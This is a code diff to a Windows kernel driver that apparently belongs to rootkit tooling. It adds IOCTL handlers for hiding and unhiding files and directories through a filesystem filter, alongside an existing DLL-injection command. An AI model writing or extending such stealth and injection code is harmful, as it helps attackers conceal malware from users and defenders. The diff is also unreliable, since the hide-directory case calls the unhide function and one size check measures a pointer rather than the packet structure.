@@ -7,6 +7,7 @@
 #include "DeviceAPI.h"
 #include "PsTable.h"
 #include "Injection.h"
+#include "FsFilter.h"
 #include "Device.h"
 
 BOOLEAN					g_deviceInitialized = FALSE;
@@ -81,6 +82,42 @@ NTSTATUS IOInjectDLL(PBUT_DLL_INJECTION_PACKET pPacket, SIZE_T szSize) {
 	return InjectDLL(pPacket->dwProcessId, &dllPath);
 }
 
+NTSTATUS IOHideFile(PBUT_HIDE_FILE_PACKET pPacket, SIZE_T szSize) {
+	if (szSize < sizeof(BUT_HIDE_FILE_PACKET)) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	UNICODE_STRING filePath;
+	RtlInitUnicodeString(&filePath, pPacket->wFullPath);
+	return AddHiddenFile(&filePath, &pPacket->uObjectId);
+}
+
+NTSTATUS IOUnhideFile(PBUT_UNHIDE_FILE_PACKET pPacket, SIZE_T szSize) {
+	if (szSize < sizeof(PBUT_UNHIDE_FILE_PACKET)) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	return RemoveHiddenFile(pPacket->uObjectId);
+}
+
+NTSTATUS IOHideDirectory(PBUT_HIDE_DIRECTORY_PACKET pPacket, SIZE_T szSize) {
+	if (szSize < sizeof(BUT_HIDE_DIRECTORY_PACKET)) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	UNICODE_STRING filePath;
+	RtlInitUnicodeString(&filePath, pPacket->wFullPath);
+	return AddHiddenDir(&filePath, &pPacket->uObjectId);
+}
+
+NTSTATUS IOUnhideDirectory(PBUT_UNHIDE_DIRECTORY_PACKET pPacket, SIZE_T szSize) {
+	if (szSize < sizeof(BUT_UNHIDE_DIRECTORY_PACKET)) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	return RemoveHiddenDir(pPacket->uObjectId);
+}
+
 // ====================================================================
 
 NTSTATUS IRPDeviceCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
@@ -143,6 +180,11 @@ NTSTATUS IRPIoControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 		}
 
 		case BUT_IOCTL_SET_DRIVER_STATE: {
+			if (szInputBufferSize < sizeof(BOOLEAN)) {
+				statusPacket.ntStatus = STATUS_INVALID_PARAMETER;
+				goto cleanup;
+			}
+
 			statusPacket.ntStatus = STATUS_SUCCESS;
 			ChangeDriverState(*(PBOOLEAN)pInputBuffer);
 			break;
@@ -175,6 +217,40 @@ NTSTATUS IRPIoControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 		case BUT_IOCTL_INJECT_DLL: {
 			statusPacket.ntStatus = IOInjectDLL((PBUT_DLL_INJECTION_PACKET)pInputBuffer,
 				szInputBufferSize);
+			break;
+		}
+
+		case BUT_IOCTL_HIDE_FILE: {
+			statusPacket.ntStatus = IOHideFile((PBUT_HIDE_FILE_PACKET)pInputBuffer,
+				szInputBufferSize);
+			break;
+		}
+
+		case BUT_IOCTL_UNHIDE_FILE: {
+			statusPacket.ntStatus = IOUnhideFile((PBUT_UNHIDE_FILE_PACKET)pInputBuffer,
+				szInputBufferSize);
+			break;
+		}
+
+		case BUT_IOCTL_HIDE_DIRECTORY: {
+			statusPacket.ntStatus = IOUnhideDirectory((PBUT_HIDE_DIRECTORY_PACKET)pInputBuffer,
+				szInputBufferSize);
+			break;
+		}
+
+		case BUT_IOCTL_UNHIDE_DIRECTORY: {
+			statusPacket.ntStatus = IOUnhideDirectory((PBUT_UNHIDE_DIRECTORY_PACKET)pInputBuffer,
+				szInputBufferSize);
+			break;
+		}
+
+		case BUT_IOCTL_UNHIDE_ALL_FILES: {
+			statusPacket.ntStatus = RemoveAllHiddenFiles();
+			break;
+		}
+
+		case BUT_IOCTL_UNHIDE_ALL_DIRECTORIES: {
+			statusPacket.ntStatus = RemoveAllHiddenDirs();
 			break;
 		}
 
